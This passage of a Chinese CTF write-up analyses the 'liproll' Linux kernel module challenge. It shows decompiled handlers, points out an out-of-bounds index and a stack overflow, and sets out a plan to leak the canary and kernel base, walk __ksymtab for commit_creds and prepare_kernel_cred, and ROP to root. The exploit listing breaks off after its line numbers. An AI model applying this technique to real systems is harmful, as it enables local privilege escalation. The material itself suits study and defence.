 <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通俗地理解为菜单，提供了create，cast，choose，reset功能，其中：</p><ul><li><p>create:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">create_a_spell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"> </span><br><span class="line">  v0 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="keyword">int</span>)v0;</span><br><span class="line">    <span class="keyword">if</span> ( !lists[v0] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v0 == <span class="number">0x10</span> )</span><br><span class="line">      <span class="keyword">return</span> printk(<span class="string">"[-] Full!\n"</span>);</span><br><span class="line">  &#125; </span><br><span class="line">  result = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">8</span>], <span class="number">0xCC0</span>LL, <span class="number">0x100</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> create_a_spell_cold();</span><br><span class="line">  lists[v1] = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单地通过kmalloc申请一个0x100的chunk，存在<code>list</code>数组里（这里<code>kmem_cache_alloc_trace(kmalloc_caches[8], 0xCC0LL, 0x100LL);</code>个人认为可能是被优化了，行为上应该等价于<code>kmalloc(0x100)</code>，不过不是很重要。</p></li><li><p>choose：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">fastcall <span class="title">choose_a_spell</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">    </span><br><span class="line">  v1 = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1 &gt; <span class="number">0xFF</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)choose_a_spell_cold();</span><br><span class="line">  result = (<span class="keyword">void</span> *)lists[v1];</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)choose_a_spell_cold();</span><br><span class="line">  global_buffer = result;</span><br><span class="line">  *((_DWORD *)&amp;global_buffer + <span class="number">2</span>) = <span class="number">0x100</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把<code>list</code>数组中，给定下标中存在的指针赋值给<code>global_buffer</code>，并且把<code>*((_DWORD *)&amp;global_buffer + 2)</code>（其实就是size）设置为0x100。</p><p>显然这里下标是来源于用户程序可控的，且判断只需要小于0x100，<code>list</code> 本身容量就是0x10，显然存在溢出。</p></li><li><p>reset：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">global_buffer = <span class="number">0L</span>L;</span><br><span class="line">*(&amp;global_buffer + <span class="number">1</span>) = <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure><p>清空<code>global_buffer</code>并且设置<code>size = 0</code>。</p></li><li><p>cast：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">cast_a_spell</span><span class="params">(__int64 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE v5[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+100h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+110h] [rbp-10h]</span></span><br><span class="line">    </span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !global_buffer )</span><br><span class="line">    <span class="keyword">return</span> cast_a_spell_cold();</span><br><span class="line">  v6 = global_buffer;</span><br><span class="line">  v1 = *((_DWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">  v2 = <span class="number">0x100</span>;</span><br><span class="line">  v3 = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x100</span> )</span><br><span class="line">    v2 = *((_DWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( !copy_from_user(v5, v3, v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(global_buffer, v5, *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)a1 + <span class="number">2</span>));</span><br><span class="line">    global_buffer = v6;</span><br><span class="line">    </span><br><span class="line">    *((_DWORD *)&amp;global_buffer + <span class="number">2</span>) = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>*((_DWORD *)a1 + 2);</code>是来自于用户程序的，且<code>copy_from_user</code>的size参数正好来自于<code>*((_DWORD *)a1 + 2);</code>，而没有检查，所以存在stack overflow。</p><p>这样，<code>v6</code>和<code>v7</code>的值都可以被覆盖，也就是说<code>glabal_buffer</code>和<code>size</code>都是完全可控的。</p></li></ul></li><li><p>read：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">liproll_read</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD v5[<span class="number">35</span>]; <span class="comment">// [rsp+0h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">32</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( global_buffer )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)global_buffer &gt;= vmlinux_base + <span class="number">0x12EE908</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> __int64)global_buffer &lt; vmlinux_base + <span class="number">0x13419A0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> liproll_read_cold();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(v5, global_buffer, *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;global_buffer + <span class="number">2</span>));</span><br><span class="line">    <span class="keyword">if</span> ( !copy_to_user(a2, v5, a3) )</span><br><span class="line">      <span class="keyword">return</span> a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以注意到这里的<code>memcpy</code>，在<code>*((unsigned int *)&amp;global_buffer + 2)</code>可控的情况下，同样存在溢出；也可以通过设置<code>size = 0</code>，或者放大<code>a3</code>参数的值，leak出栈上的数据。</p></li><li><p>write：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">liproll_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  _QWORD v7[<span class="number">35</span>]; <span class="comment">// [rsp+0h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7[<span class="number">32</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !global_buffer )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  v3 = <span class="number">256L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x100</span> )</span><br><span class="line">    v3 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(v7, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  v4 = global_buffer;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 &lt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (v3 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)global_buffer = v7[<span class="number">0</span>];</span><br><span class="line">      *(_DWORD *)&amp;v4[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 - <span class="number">4</span>] = *(_DWORD *)((<span class="keyword">char</span> *)v7 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 - <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)global_buffer = v7[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">if</span> ( (v3 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_WORD *)&amp;v4[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 - <span class="number">2</span>] = *(_WORD *)((<span class="keyword">char</span> *)v7 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="keyword">char</span> *)(((<span class="keyword">unsigned</span> __int64)global_buffer + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL);</span><br><span class="line">    *(_QWORD *)global_buffer = v7[<span class="number">0</span>];</span><br><span class="line">    *(_QWORD *)&amp;v4[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3 - <span class="number">8</span>] = *(_QWORD *)((<span class="keyword">char</span> *)&amp;v7[<span class="number">-1</span>] + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3);</span><br><span class="line">    qmemcpy(v5, (<span class="keyword">char</span> *)v7 - (v4 - v5), <span class="number">8L</span>L * ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v3 + (_DWORD)v4 - (_DWORD)v5) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数就是向<code>global_buffer</code>里写入数据。</p></li></ul></li><li><p>其次调试的过程中发现，这里的<code>kaslr</code>和用户态程序的<code>aslr</code>不太一样，不论是liproll模块的相关的函数地址，还是kernel的一些内核函数，都不是简单的相对于base address有一个固定的偏移，而近乎是完全随机的感觉；比如对于liproll模块：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/module/liproll/sections/.</span><br><span class="line">../                            .text.cast_a_spell</span><br><span class="line">./                             .text.check_bound</span><br><span class="line">.bss                           .text.choose_a_spell</span><br><span class="line">.data                          .text.create_a_spell</span><br><span class="line">.exit.text                     .text.liproll_open</span><br><span class="line">.gnu.linkonce.this_module      .text.liproll_read</span><br><span class="line">.init.text                     .text.liproll_release</span><br><span class="line">.note.Linux                    .text.liproll_unlocked_ioctl</span><br><span class="line">.note.gnu.build-id             .text.liproll_write</span><br><span class="line">.orc_unwind                    .text.reset_the_spell</span><br><span class="line">.orc_unwind_ip                 .text.unlikely.cast_a_spell</span><br><span class="line">.rodata.str1.1                 .text.unlikely.choose_a_spell</span><br><span class="line">.rodata.str1.8                 .text.unlikely.create_a_spell</span><br><span class="line">.strtab                        .text.unlikely.liproll_read</span><br><span class="line">.symtab</span><br></pre></td></tr></table></figure><p>每个函数都有独立的section，而这些section实际加载的地址都是不可预测的（当然section和section之间的相对偏移可能是有一定的预测性的，比如.bss和.data section相差0x4c0就是固定的，后面利用会用到这点）。</p><p>同样的，从bzImage中提取出vmlinux分析，也可以发现，存在着类似的.text.func_name的section，使得<code>prepare_kernel_cred</code>和<code>commit_creds</code>偏移不是相对vmlinux_base固定；但是像<code>liproll_open</code>中通过<code>copy_page</code>函数地址算出vmlinux_base的时候，减去固定偏移，可以看出<code>copy_page</code>的偏移是固定的，同时vmlinux文件中不存在<code>.text.copy_page</code>的section。</p></li><li><p>其次，在<code>liproll_read</code>这里，有一个check，即：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)global_buffer &gt;= vmlinux_base + <span class="number">0x12EE908</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> __int64)global_buffer &lt; vmlinux_base + <span class="number">0x13419A0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> liproll_read_cold();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么<code>vmlinux_base + 0x12EE908 ~ vmlinux_base + 0x13419A0</code>这部分内存就显得很可疑，调试中发现，这部分内存正好是<code>__ksymtab</code>，<code>__ksmtab_gpl</code>和<code>ksymtab_strings</code>这三个section。</p><p>重点在于，<code>__ksymtab</code>这个section，相当于一个<code>size=0xC</code>的结构体的数组，前4 bytes表示函数地址的偏移，中间4 bytes表示函数名的偏移，最后4 bytes也是偏移：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__ksymtab:FFFFFFFF822EE908 __ksymtab       segment dword public &#39;CONST&#39; use64</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 assume cs:__ksymtab</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 ;org 0FFFFFFFF822EE908h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908 ; struct func_struct _ksymtab_array[5944]</span><br><span class="line">__ksymtab:FFFFFFFF822EE908 __ksymtab_array dd 0FF15CB08h, 207DFh, 314F1h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                                         ; DATA XREF: sub_FFFFFFFF81505000+11C↑o</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                                         ; sub_FFFFFFFF81505000+123↑o ...</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF331E4Ch, 29490h, 314E5h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4EC780h, 30040h, 314D9h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4ED4F4h, 30079h, 314CDh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4ED4C8h, 300A8h, 314C1h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4EBE5Ch, 2FFECh, 314B5h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4EE630h, 30038h, 314A9h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4EC284h, 2FFE8h, 3149Dh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4EEDA8h, 3005Ah, 31491h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4EBDFCh, 30000h, 31485h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF377750h, 2A291h, 31479h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF2A8794h, 26BC4h, 3146Dh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF2A7538h, 26BB1h, 31461h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF2A751Ch, 26B94h, 31455h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF982850h, 48936h, 31449h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF5000A4h, 30CC7h, 3143Dh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4D9CF8h, 2F487h, 31431h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4C3EDCh, 2E471h, 31425h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF2CF4C0h, 270CDh, 31419h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF97BA04h, 48682h, 3140Dh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF32DE88h, 2912Bh, 31401h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4AA3DCh, 2D565h, 313F5h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF520h, 2E8E4h, 313E9h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF5E4h, 2E8FEh, 313DDh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF7E8h, 2E954h, 313D1h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF4CCh, 2E878h, 313C5h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF450h, 2E85Dh, 313B9h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF664h, 2E8EFh, 313ADh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF548h, 2E8A9h, 313A1h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF60Ch, 2E8C6h, 31395h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF720h, 2E8FFh, 31389h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CFB94h, 2E859h, 3137Dh</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CFA78h, 2E838h, 31371h</span><br><span class="line">__ksymtab:FFFFFFFF822EE908                 dd 0FF4CF68Ch, 2E8BBh, 31365h</span><br></pre></td></tr></table></figure><p>比如第一项<code>dd 0FF331E4Ch, 29490h, 314E5h</code>，计算出<code>(0x822EE908 + 0xFF15CB08C) &amp; ((1 &lt;&lt; 32) - 1) | (0xFFFFFFFF &lt;&lt; 32) = 0xffffffff8144b410</code>；以及<code>(0x822EE90C + 0x207DF) &amp; ((1 &lt;&lt; 32) - 1) | (0xFFFFFFFF &lt;&lt; 32) = 0xffffffff8230f0eb</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text.IO_APIC_get_PCI_irq_vector:FFFFFFFF8144B410 ; FUNCTION CHUNK AT </span><br><span class="line"></span><br><span class="line">__ksymtab_strings:FFFFFFFF8230F0EB aIoApicGetPciIr db &#39;IO_APIC_get_PCI_irq_vector&#39;,0</span><br></pre></td></tr></table></figure><p>说明这就是个符号表，如果能够便利符号表查找<code>prepare_kernel_cred</code>和<code>commit_creds</code>的地址，那么问题就简单了。</p></li><li><p>那么整个利用思路为：</p><ul><li><p>首先利用<code>liproll_read</code>把canary给leak出来</p></li><li><p>然后利用<code>cast_a_spell</code>功能存在的溢出，把<code>global_buffer</code>覆盖为任意非0值，以及<code>*((_DWORD *)&amp;global_buffer + 2)</code>覆盖为0。</p></li><li><p>之后调用<code>liproll_read</code>的时候，由于<code>memcpy(v5, global_buffer, *((unsigned int *)&amp;global_buffer + 2));</code>参数中<code>size = 0</code>，所以相当于没有执行，就能把栈上的残留数据leak出来；调试过程中发现leak出来的数据中，通过偏移为0x18的数据，可以得到liproll模块.data section的起始地址，即<code>uint64_t _data_sec = ((*(uint64_t *)(buf + 0x18) &gt;&gt; 12) &lt;&lt; 12) + 0x2000;</code>，其次.bss section和.data section的偏移固定，为0x4c0，同样可以计算出.bss section的起始地址：<code>uint64_t _bss_sec = _data_sec + 0x4C0;</code>。</p></li><li><p>那么获得了.bss section的地址后，就能继续利用<code>cast_a_spell</code>存在的栈溢出，把<code>global_buffer</code>指向.bss上vmlinux_base的位置，这样就把vmlinux加载基址给leak出来了；于此同时，可以通过<code>liproll_write</code>将其覆盖为0，绕过之后调用<code>liproll_read</code>中的check：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)global_buffer &gt;= vmlinux_base + <span class="number">0x12EE908</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> __int64)global_buffer &lt; vmlinux_base + <span class="number">0x13419A0</span> )</span><br></pre></td></tr></table></figure></li><li><p>通过不断地利用<code>cast_a_spell</code>中的栈溢出修改<code>global_buffer</code>，遍历<code>__ksymtab</code>，找到<code>prepare_kernel_cred</code>和<code>commit_creds</code>的地址。</p></li><li><p>最后只要构造rop提权即可，因为并没有开启smep保护，所以gadget可以在用户态程序中构造。</p></li></ul></li><li><p>exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span 